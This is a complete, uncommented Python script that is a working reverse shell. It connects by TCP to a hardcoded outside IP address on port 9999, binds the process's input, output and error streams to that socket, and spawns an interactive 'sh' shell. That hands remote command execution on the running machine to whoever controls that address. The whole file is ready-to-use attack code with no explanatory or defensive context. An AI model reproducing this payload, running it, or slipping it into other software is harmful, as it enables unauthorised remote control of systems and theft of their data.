import socket,subprocess,os
import pty

def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('120.26.119.225',9999))
    os.dup2(s.fileno(),0) 
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn('sh')

if __name__ == "__main__":
    main()